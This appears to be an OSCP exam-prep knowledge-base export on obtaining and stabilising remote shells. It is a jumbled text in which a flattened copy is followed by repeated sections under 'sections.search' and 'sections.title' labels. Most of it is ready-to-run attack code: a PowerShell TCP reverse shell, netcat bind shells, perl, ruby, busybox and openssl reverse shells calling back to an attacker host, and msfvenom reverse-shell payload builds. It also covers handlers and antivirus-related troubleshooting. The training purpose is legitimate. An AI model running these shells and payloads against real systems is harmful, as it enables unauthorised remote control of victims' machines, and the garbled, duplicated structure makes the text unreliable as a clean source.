> **shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every bash construct. wrap bash-specific syntax in `bash -c '...'` and then encode it for the outer http/template/database layer. ## windows session options prefer an available authenticated service: ```bash evil-winrm -i target -u user -p 'password' xfreerdp /v:target /u:'domain\user' /p:'password' /cert:ignore ssh -p port user@target ``` powershell tcp shell when direct command execution is the only primitive: ```powershell $client = [net.sockets.tcpclient]::new('lhost',lport) $stream = $client.getstream() $buffer = new-object byte[] 65535 while (($count = $stream.read($buffer,0,$buffer.length)) -gt 0) { $command = [text.encoding]::ascii.getstring($buffer,0,$count) $output = (invoke-expression $command 2>&1 | out-string) + "ps $((get-location).path)> " $bytes = [text.encoding]::ascii.getbytes($output) $stream.write($bytes,0,$bytes.length) $stream.flush() } $client.close() ``` > this is a basic command channel, not a conpty. host policy, language mode, amsi/antimalware, quoting and the parent process can affect it. powershell `-encodedcommand` solves nested quoting; it is not encryption or an av bypass. generate utf-16le base64 locally: ```powershell $command = 'command' $encoded = [convert]::tobase64string([text.encoding]::unicode.getbytes($command)) $encoded ``` invoke in the target command context: ```cmd powershell.exe -noprofile -noninteractive -encodedcommand base64_utf16le ``` ## bind shells use a bind shell only when kali can reach a target listener and reverse egress is unavailable. traditional netcat with `-e` support on a linux target: ```bash nc -lvnp port -e /bin/sh ``` connect from kali: ```bash nc -nv target port ``` fifo alternative when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp port >/tmp/f ``` ncat target listener: ```bash ncat -4 -lvn 0.0.0.0 port --exec /bin/sh ``` > bind shells expose a target port and may be blocked by the host firewall or upstream acl. a successful local bind does not prove kali can reach it. ## generate payloads after selecting context list rather than guess names and formats: ```bash msfvenom -l payloads | grep -e 'linux|windows' | grep -e 'x64|x86' msfvenom --list formats msfvenom -p payload_name --list-options ``` stageless command-shell binaries: ```bash msfvenom -p linux/x64/shell_reverse_tcp \ lhost=lhost lport=lport \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ lhost=lhost lport=lport \ -f exe -o shell.exe ``` verify the resulting artifacts: ```bash file shell.elf shell.exe sha256sum shell.elf shell.exe ``` > `msfvenom` does not make a payload compatible with the delivery path. match target os, process architecture, payload type, output format, available execution method and callback route. ### staged versus stageless ```text stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer ``` metasploit naming commonly reflects the distinction: ```text windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged ``` a raw netcat listener can receive many ordinary stageless command shells. a staged payload normally needs `multi/handler` configured with the exact same payload: ```text msfconsole -q use exploit/multi/handler set payload payload_name set lhost lhost set lport lport show options run ``` > a connection to netcat with no usable commands can mean a staged payload reached a non-staging listener. it is not necessarily failed code execution. ### existing-poc payload constraints only when an existing reviewed poc documents payload space and bad characters: ```bash msfvenom -p payload_name \ lhost=lhost lport=lport \ -f format -v variable \ -b 'bad_characters' \ -s max_space ``` encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. ## diagnose quoting and encoding by layer write the parser chain explicitly: ```text http/sql/template parser → application language → command launcher (`system`, `cmd /c`, `/bin/sh -c`, powershell) → target shell/interpreter → payload command ``` test each layer with a small command. encode only for the layer that consumes the characters: ```bash python3 -c 'import urllib.parse; print(urllib.parse.quote("command"))' ``` typical failures: - `&`, `|`, `>`, `<`, `$`, backticks, quotes or spaces consumed by an outer shell; - url decoding occurs zero, one or two times; - json, xml, sql or template quoting changes the command; - powershell receives utf-8 base64 instead of required utf-16le; - payload length exceeds a field, command line or exploit buffer; - 32-bit payload is injected into a 64-bit context or the reverse. ## diagnose a missing callback in order 1. **delivery:** prove the request/file/argument reaches the intended consumer. 2. **execution:** prove `id`/`whoami`, hostname or a bounded side effect in the exact context. 3. **parser:** verify quoting, encoding, interpreter, working directory and length. 4. **payload:** confirm os, architecture, format, staged/stageless type and dependencies. 5. **listener:** start it first and verify the bound address and port. 6. **route:** test target-to-listener reachability from the execution context. 7. **security control:** use concrete errors, quarantine, logs or process behavior. 8. **session:** repair tty, buffering, encoding and job control after connection. target-side route checks where available: ```bash nc -vz lhost lport curl -v --connect-timeout 5 http://lhost:lport/ ``` ```powershell test-netconnection lhost -port lport -informationlevel detailed ``` observe kali while triggering: ```bash sudo tcpdump -ni any tcp port lport ``` interpretation: | observation | next decision | | --- | --- | | no syn reaches kali | wrong execution, lhost, route, egress or earlier parser layer | | syn arrives; no listener response | wrong bind/interface/port or local firewall | | tcp handshake then immediate close | payload/handler mismatch, crash or security control | | connection stays but no commands | staged/raw mismatch, buffering or i/o/session issue | ## handle security-control evidence proportionately windows defender status, when the current identity can query it: ```powershell get-mpcomputerstatus | select-object antivirusenabled,realtimeprotectionenabled,behaviormonitorenabled,ioavprotectionenabled ``` do not label every failure “av.” differentiate: - file never arrived or hashes differ; - file arrived and disappeared/quarantined; - process creation was denied; - script content was blocked; - process started and exited/crashed; - callback was blocked after execution; - application-control or language-mode restrictions; - ordinary format, architecture, permission or dependency errors. prefer an already available native or authenticated route when it satisfies the objective. encoding is transport representation, not proof of evasion. custom shellcode development and deep av-bypass work are outside this unit. for motw/office/library-file delivery, execution-policy precedence, amsi/applocker/defender evidence and restricted metasploit module/session handling, continue with [payload execution obstacles](06-payload-execution-obstacles.md). ## stabilize a linux tty first obtain a pty with an available interpreter: ```bash python3 -c 'import pty; pty.spawn("/bin/bash")' ``` press `ctrl-z` locally, then: ```bash stty raw -echo; fg ``` back in the remote shell: ```bash reset export term=xterm-256color stty rows 40 columns 120 ``` if the local terminal becomes unreadable, restore it from a separate/local shell: ```bash stty sane ``` socat can provide a stronger pty when present on both sides: ```bash # kali socat file:$(tty),raw,echo=0 tcp-listen:lport,reuseaddr # target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lhost:lport ``` > tty repair changes terminal behavior, not privilege or network reliability. a pty may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. ## verify every new session linux: ```bash hostname; id; pwd ip addr; ip route ss -lntup ``` windows: ```cmd hostname whoami /all cd ipconfig /all route print netstat -ano ``` record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. then re-enumerate from the new state. ## failure router | symptom | interpretation / next action | | --- | --- | | direct command fails | repair exploit/request/parser before payload work | | direct command succeeds, no syn | correct payload, lhost, interpreter or egress | | listener absent/wrong bind | bind before trigger and verify with `ss` | | connection to raw listener, no i/o | check staged payload or buffering | | immediate disconnect | check process crash, handler/payload match and exit behavior | | shell lacks job control | spawn pty and repair local terminal state | | arrow keys/control characters break | correct pty, raw mode and `term` | | windows shell output is garbled | check code page/encoding and payload channel | | file vanishes after transfer | gather quarantine/security-control evidence | | works once, not again | check single-use listener, service crash, cleanup and trigger state | ## exam boundary the current oscp+ guide permits `msfvenom` and `exploit/multi/handler` against all targets, but meterpreter and metasploit auxiliary/exploit/post modules become locked to one selected target. metasploit pivoting is prohibited. ai chatbots are prohibited during the actual exam. recheck the current guide before a mock or exam. ## powercat — windows powershell shell transport use when a reviewed powercat.ps1 is available and the current powershell context permits it. keep the listener and target connection direction explicit. ```bash # attacker: listener nc -lvnp lport ``` ```powershell # target: load the local reviewed script and connect back . .\powercat.ps1 powercat -c lhost -p lport -e cmd.exe ``` read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. script-policy/av/runtime failures → use the existing native transfer and shell alternatives. powercat does not repair a missing callback route. sources: [upstream 1](https://github.com/besimorhino/powercat). ## penelope or pwncat-cs — handle an existing shell and move files choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project. ```bash # basic reverse-shell listener with pwncat-cs pwncat-cs -lp lport # alternative: open penelope's current cli help, then select its listener port penelope --help penelope -p lport ``` in pwncat-cs's local prompt, use only the operation needed: ```text download /remote/file ./local_file upload ./local_file /remote/file back ``` for penelope, f12 detaches a pty session to its menu; `interact session_id` returns to it. verify uploaded bytes and the target identity after reconnecting. optional modules can fetch/run additional tools or exploitation features; they are separate actions and are not part of this basic handler workflow. sources: [upstream 1](https://github.com/brightio/penelope) · [upstream 2](https://github.com/calebstewart/pwncat). ## keep listeners and long-running checks in tmux use on your own attack workstation to retain a working listener or pspy view while switching terminals. a tmux pane is not a second target shell unless you create/connect one. ```bash tmux new-session -s oscp tmux list-sessions tmux attach-session -t oscp # capture existing pane history from another terminal; not a full session recorder tmux capture-pane -p -s - -t oscp:0.0 > pane-history.txt ``` within tmux: ctrl-b then d detaches; ctrl-b then c creates a window; ctrl-b then w selects one. read: scrollback capture only contains retained history. continue saving raw scanner/tool output and proof explicitly rather than relying on terminal history alone. sources: [upstream 1](https://github.com/tmux/tmux/blob/master/tmux.1). ## aspx handler check before generating a windows payload use only when you can place a file at a path served by an asp.net handler. a static upload on iis, classic asp, php or asp.net core does not automatically execute aspx pages. ```aspx <%@ page language="c#" %> <% response.write(system.security.principal.windowsidentity.getcurrent().name); %> ``` save as a uniquely named test aspx file, upload through the verified write primitive, then request its actual stored url: ```bash curl -i http://target:port/actual_path/probe.aspx ``` read: the process identity, rather than literal source or a file download, verifies server-side handling. then use the matching aspx/windows payload generation already covered here, with the correct runtime/architecture and return route. delete the test artifact after validation. sources: [upstream 1](https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)). ## shell alternatives when the installed runtime changes choose one matching the actual target runtime and a reachable listener. these alternatives retain the current execution identity; they do not create privilege by themselves. ```bash # attacker nc -lvnp lport # target: busybox build with the optional nc -e feature busybox nc -e /bin/sh lhost lport # target: perl with socket support perl -e 'use socket;$i="lhost";$p=lport;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));connect(s,sockaddr_in($p,inet_aton($i)));open(stdin,"<&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");' # target: ruby with its socket library ruby -rsocket -e 's=tcpsocket.new("lhost",lport);exec("/bin/sh","-i",in:s,out:s,err:s)' ``` read: check hostname/id after connecting, then use the existing pty stabilization steps. missing runtime, unsupported busybox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. a noninteractive process can execute correctly while lacking a terminal. sources: [upstream 1](https://busybox.net/downloads/busybox.html) · [upstream 2](https://perldoc.perl.org/socket) · [upstream 3](https://docs.ruby-lang.org/en/master/kernel.html#method-i-exec). ## openssl transport when a tls callback is useful use when openssl exists on both ends and the actual route permits the chosen listener. tls is a transport choice, not a fix for an unreachable destination. ```bash # attacker: create a short-lived local test certificate, then listen openssl req -x509 -newkey rsa:2048 -nodes -days 1 \ -subj '/cn=listener' -keyout listener.key -out listener.crt openssl s_server -quiet -accept lport -cert listener.crt -key listener.key # target: connect a shell through the fifo and tls client mkfifo /tmp/shell-pipe /bin/sh -i < /tmp/shell-pipe 2>&1 | \ openssl s_client -quiet -connect lhost:lport > /tmp/shell-pipe ``` read: verify the session identity and preserve the working channel. this example does not authenticate the listener certificate. a tls handshake failure, a refused socket and a missing shell are different failures. use a unique writable fifo path and remove the test pipe after the session. sources: [upstream 1](https://docs.openssl.org/master/man1/openssl-s_server/) · [upstream 2](https://docs.openssl.org/master/man1/openssl-s_client/). ## sources - supplied pen-200 pp257-259, ch 13-14 pp375-415, ch 15 pp416-441 selectively, ch 19 pty examples and ch 21.2 pp671-683 - [current oscp+ body of knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-oscp-body-of-knowledge) - [current oscp+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-oscp-exam-guide) - [metasploit msfvenom documentation](https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/how-to-use-msfvenom.md) - [ncat basic usage](https://nmap.org/ncat/guide/ncat-usage.html) and [command execution](https://nmap.org/ncat/guide/ncat-exec.html) - [powershell command-line documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1) - [microsoft defender `get-mpcomputerstatus`](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps) - [getsh useful stuff and tool cheatsheet](https://lizajose.github.io/getsh/useful-stuff), source snapshot [`e1f62dd`](https://github.com/lizajose/getsh/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)

## keep four states separate

```text
delivery → execution → connection → usable session
```

| state | decisive evidence | does not yet prove |
| --- | --- | --- |
| delivery | exact bytes/request reached intended consumer | payload executed |
| execution | harmless command output or controlled side effect | network callback works |
| connection | listener records the expected peer | commands and i/o are usable |
| session | commands return and host/identity are verified | higher privilege or stability |

do not change all four layers at once. preserve the last confirmed state and test the next boundary.

sections.search:
## choose the access form

| situation | prefer | main prerequisite / limitation |
| --- | --- | --- |
| one bounded action is enough | direct command execution | observable output or side effect; no shell required |
| valid credential and remote service | ssh, winrm or rdp | authentication plus remote-logon authorization |
| target can reach kali | reverse shell | target egress and a reachable kali listener |
| kali can reach a target listener | bind shell | target can bind and inbound path permits it |
| payload is staged or protocol-aware | matching framework handler | handler must use the exact payload/transport |

prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell.

## windows session options

prefer an available authenticated service:

```bash
evil-winrm -i target -u user -p 'password'
xfreerdp /v:target /u:'domain\user' /p:'password' /cert:ignore
ssh -p port user@target
```

powershell tcp shell when direct command execution is the only primitive:

```powershell
$client = [net.sockets.tcpclient]::new('lhost',lport)
$stream = $client.getstream()
$buffer = new-object byte[] 65535
while (($count = $stream.read($buffer,0,$buffer.length)) -gt 0) {
  $command = [text.encoding]::ascii.getstring($buffer,0,$count)
  $output = (invoke-expression $command 2>&1 | out-string) + "ps $((get-location).path)> "
  $bytes = [text.encoding]::ascii.getbytes($output)
  $stream.write($bytes,0,$bytes.length)
  $stream.flush()
}
$client.close()
```

> this is a basic command channel, not a conpty. host policy, language mode, amsi/antimalware, quoting and the parent process can affect it.

powershell `-encodedcommand` solves nested quoting; it is not encryption or an av bypass. generate utf-16le base64 locally:

```powershell
$command = 'command'
$encoded = [convert]::tobase64string([text.encoding]::unicode.getbytes($command))
$encoded
```

invoke in the target command context:

```cmd
powershell.exe -noprofile -noninteractive -encodedcommand base64_utf16le
```

## bind shells

use a bind shell only when kali can reach a target listener and reverse egress is unavailable.

traditional netcat with `-e` support on a linux target:

```bash
nc -lvnp port -e /bin/sh
```

connect from kali:

```bash
nc -nv target port
```

fifo alternative when `-e` is absent:

```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp port >/tmp/f
```

ncat target listener:

```bash
ncat -4 -lvn 0.0.0.0 port --exec /bin/sh
```

> bind shells expose a target port and may be blocked by the host firewall or upstream acl. a successful local bind does not prove kali can reach it.

## generate payloads after selecting context

list rather than guess names and formats:

```bash
msfvenom -l payloads | grep -e 'linux|windows' | grep -e 'x64|x86'
msfvenom --list formats
msfvenom -p payload_name --list-options
```

stageless command-shell binaries:

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f elf -o shell.elf

msfvenom -p windows/x64/shell_reverse_tcp \
  lhost=lhost lport=lport \
  -f exe -o shell.exe
```

verify the resulting artifacts:

```bash
file shell.elf shell.exe
sha256sum shell.elf shell.exe
```

> `msfvenom` does not make a payload compatible with the delivery path. match target os, process architecture, payload type, output format, available execution method and callback route.

### staged versus stageless

```text
stageless: complete payload delivered at once; larger, usually simpler and more stable
staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
```

metasploit naming commonly reflects the distinction:

```text
windows/x64/shell_reverse_tcp   stageless
windows/x64/shell/reverse_tcp   staged
```

a raw netcat listener can receive many ordinary stageless command shells. a staged payload normally needs `multi/handler` configured with the exact same payload:

```text
msfconsole -q
use exploit/multi/handler
set payload payload_name
set lhost lhost
set lport lport
show options
run
```

> a connection to netcat with no usable commands can mean a staged payload reached a non-staging listener. it is not necessarily failed code execution.

### existing-poc payload constraints

only when an existing reviewed poc documents payload space and bad characters:

```bash
msfvenom -p payload_name \
  lhost=lhost lport=lport \
  -f format -v variable \
  -b 'bad_characters' \
  -s max_space
```

encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.

sections.title: Staged versus stageless
sections.search:
### staged versus stageless

```text
stageless: complete payload delivered at once; larger, usually simpler and more stable
staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer
```

metasploit naming commonly reflects the distinction:

```text
windows/x64/shell_reverse_tcp   stageless
windows/x64/shell/reverse_tcp   staged
```

a raw netcat listener can receive many ordinary stageless command shells. a staged payload normally needs `multi/handler` configured with the exact same payload:

```text
msfconsole -q
use exploit/multi/handler
set payload payload_name
set lhost lhost
set lport lport
show options
run
```

> a connection to netcat with no usable commands can mean a staged payload reached a non-staging listener. it is not necessarily failed code execution.

sections.title: Existing-PoC payload constraints
sections.search:
### existing-poc payload constraints

only when an existing reviewed poc documents payload space and bad characters:

```bash
msfvenom -p payload_name \
  lhost=lhost lport=lport \
  -f format -v variable \
  -b 'bad_characters' \
  -s max_space
```

encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list.

sections.title: Diagnose quoting and encoding by layer
sections.search:
## diagnose quoting and encoding by layer

write the parser chain explicitly:

```text
http/sql/template parser
→ application language
→ command launcher (`system`, `cmd /c`, `/bin/sh -c`, powershell)
→ target shell/interpreter
→ payload command
```

test each layer with a small command. encode only for the layer that consumes the characters:

```bash
python3 -c 'import urllib.parse; print(urllib.parse.quote("command"))'
```

typical failures:

- `&`, `|`, `>`, `<`, `$`, backticks, quotes or spaces consumed by an outer shell;
- url decoding occurs zero, one or two times;
- json, xml, sql or template quoting changes the command;
- powershell receives utf-8 base64 instead of required utf-16le;
- payload length exceeds a field, command line or exploit buffer;
- 32-bit payload is injected into a 64-bit context or the reverse.

sections.title: Diagnose a missing callback in order
sections.search:
## diagnose a missing callback in order

1. **delivery:** prove the request/file/argument reaches the intended consumer.
2. **execution:** prove `id`/`whoami`, hostname or a bounded side effect in the exact context.
3. **parser:** verify quoting, encoding, interpreter, working directory and length.
4. **payload:** confirm os, architecture, format, staged/stageless type and dependencies.
5. **listener:** start it first and verify the bound address and port.
6. **route:** test target-to-listener reachability from the execution context.
7. **security control:** use concrete errors, quarantine, logs or process behavior.
8. **session:** repair tty, buffering, encoding and job control after connection.

target-side route checks where available:

```bash
nc -vz lhost lport
curl -v --connect-timeout 5 http://lhost:lport/
```

```powershell
test-netconnection lhost -port lport -informationlevel detailed
```

observe kali while triggering:

```bash
sudo tcpdump -ni any tcp port lport
```

interpretation:

| observation | next decision |
| --- | --- |
| no syn reaches kali | wrong execution, lhost, route, egress or earlier parser layer |
| syn arrives; no listener response | wrong bind/interface/port or local firewall |
| tcp handshake then immediate close | payload/handler mismatch, crash or security control |
| connection stays but no commands | staged/raw mismatch, buffering or i/o/session issue |

sections.title: Handle security-control evidence proportionately
Stabilize a Linux TTY
sections.search:
## stabilize a linux tty

first obtain a pty with an available interpreter:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

press `ctrl-z` locally, then:

```bash
stty raw -echo; fg
```

back in the remote shell:

```bash
reset
export term=xterm-256color
stty rows 40 columns 120
```

if the local terminal becomes unreadable, restore it from a separate/local shell:

```bash
stty sane
```

socat can provide a stronger pty when present on both sides:

```bash
# kali
socat file:$(tty),raw,echo=0 tcp-listen:lport,reuseaddr

# target
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:lhost:lport
```

> tty repair changes terminal behavior, not privilege or network reliability. a pty may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one.

sections.title: Verify every new session
sections.search:
## verify every new session

linux:

```bash
hostname; id; pwd
ip addr; ip route
ss -lntup
```

windows:

```cmd
hostname
whoami /all
cd
ipconfig /all
route print
netstat -ano
```

record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. then re-enumerate from the new state.

sections.title: Failure router
sections.search:
## failure router

| symptom | interpretation / next action |
| --- | --- |
| direct command fails | repair exploit/request/parser before payload work |
| direct command succeeds, no syn | correct payload, lhost, interpreter or egress |
| listener absent/wrong bind | bind before trigger and verify with `ss` |
| connection to raw listener, no i/o | check staged payload or buffering |
| immediate disconnect | check process crash, handler/payload match and exit behavior |
| shell lacks job control | spawn pty and repair local terminal state |
| arrow keys/control characters break | correct pty, raw mode and `term` |
| windows shell output is garbled | check code page/encoding and payload channel |
| file vanishes after transfer | gather quarantine/security-control evidence |
| works once, not again | check single-use listener, service crash, cleanup and trigger state |

sections.title: Exam boundary
sections.search:
## exam boundary

the current oscp+ guide permits `msfvenom` and `exploit/multi/handler` against all targets, but meterpreter and metasploit auxiliary/exploit/post modules become locked to one selected target. metasploit pivoting is prohibited. ai chatbots are prohibited during the actual exam. recheck the current guide before a mock or exam.

sections.title: Powercat — Windows PowerShell shell transport
sections.search:
## powercat — windows powershell shell transport

use when a reviewed powercat.ps1 is available and the current powershell context permits it. keep the listener and target connection direction explicit.

```bash
# attacker: listener
nc -lvnp lport
```

```powershell
# target: load the local reviewed script and connect back
. .\powercat.ps1
powercat -c lhost -p lport -e cmd.exe
```

read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. script-policy/av/runtime failures → use the existing native transfer and shell alternatives. powercat does not repair a missing callback route.

sources: [upstream 1](https://github.com/besimorhino/powercat).

sections.title: Penelope or pwncat-cs — handle an existing shell and move files
sections.search:
## penelope or pwncat-cs — handle an existing shell and move files

choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project.

```bash
# basic reverse-shell listener with pwncat-cs
pwncat-cs -lp lport

# alternative: open penelope's current cli help, then select its listener port
penelope --help
penelope -p lport
```

in pwncat-cs's local prompt, use only the operation needed:

```text
download /remote/file ./local_file
upload ./local_file /remote/file
back
```

for penelope, f12 detaches a pty session to its menu; `interact session_id` returns to it. verify uploaded bytes and the target identity after reconnecting. optional modules can fetch/run additional tools or exploitation features; they are separate actions and are not part of this basic handler workflow.

sources: [upstream 1](https://github.com/brightio/penelope) · [upstream 2](https://github.com/calebstewart/pwncat).

sections.title: Keep listeners and long-running checks in tmux
sections.search:
## keep listeners and long-running checks in tmux

use on your own attack workstation to retain a working listener or pspy view while switching terminals. a tmux pane is not a second target shell unless you create/connect one.

```bash
tmux new-session -s oscp
tmux list-sessions
tmux attach-session -t oscp

# capture existing pane history from another terminal; not a full session recorder
tmux capture-pane -p -s - -t oscp:0.0 > pane-history.txt
```

within tmux: ctrl-b then d detaches; ctrl-b then c creates a window; ctrl-b then w selects one. read: scrollback capture only contains retained history. continue saving raw scanner/tool output and proof explicitly rather than relying on terminal history alone.

sources: [upstream 1](https://github.com/tmux/tmux/blob/master/tmux.1).

sections.title: ASPX handler check before generating a Windows payload
sections.search:
## aspx handler check before generating a windows payload

use only when you can place a file at a path served by an asp.net handler. a static upload on iis, classic asp, php or asp.net core does not automatically execute aspx pages.

```aspx
<%@ page language="c#" %>
<% response.write(system.security.principal.windowsidentity.getcurrent().name); %>
```

save as a uniquely named test aspx file, upload through the verified write primitive, then request its actual stored url:

```bash
curl -i http://target:port/actual_path/probe.aspx
```

read: the process identity, rather than literal source or a file download, verifies server-side handling. then use the matching aspx/windows payload generation already covered here, with the correct runtime/architecture and return route. delete the test artifact after validation.

sources: [upstream 1](https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)).

sections.title: Shell alternatives when the installed runtime changes
sections.search:
## shell alternatives when the installed runtime changes

choose one matching the actual target runtime and a reachable listener. these alternatives retain the current execution identity; they do not create privilege by themselves.

```bash
# attacker
nc -lvnp lport

# target: busybox build with the optional nc -e feature
busybox nc -e /bin/sh lhost lport

# target: perl with socket support
perl -e 'use socket;$i="lhost";$p=lport;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));connect(s,sockaddr_in($p,inet_aton($i)));open(stdin,"<&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");'

# target: ruby with its socket library
ruby -rsocket -e 's=tcpsocket.new("lhost",lport);exec("/bin/sh","-i",in:s,out:s,err:s)'
```

read: check hostname/id after connecting, then use the existing pty stabilization steps. missing runtime, unsupported busybox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. a noninteractive process can execute correctly while lacking a terminal.

sources: [upstream 1](https://busybox.net/downloads/busybox.html) · [upstream 2](https://perldoc.perl.org/socket) · [upstream 3](https://docs.ruby-lang.org/en/master/kernel.html#method-i-exec).

sections.title: OpenSSL transport when a TLS callback is useful
sections.search:
## openssl transport when a tls callback is useful

use when openssl exists on both ends and the actual route permits the chosen listener. tls is a transport choice, not a fix for an unreachable destination.

```bash
# attacker: create a short-lived local test certificate, then listen
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
  -subj '/cn=listener' -keyout listener.key -out listener.crt
openssl s_server -quiet -accept lport -cert listener.crt -key listener.key

# target: connect a shell through the fifo and tls client
mkfifo /tmp/shell-pipe
/bin/sh -i < /tmp/shell-pipe 2>&1 | \
  openssl s_client -quiet -connect lhost:lport > /tmp/shell-pipe
```

read: verify the session identity and preserve the working channel. this example does not authenticate the listener certificate. a tls handshake failure, a refused socket and a missing shell are different failures. use a unique writable fifo path and remove the test pipe after the session.

sources: [upstream 1](https://docs.openssl.org/master/man1/openssl-s_server/) · [upstream 2](https://docs.openssl.org/master/man1/openssl-s_client/).
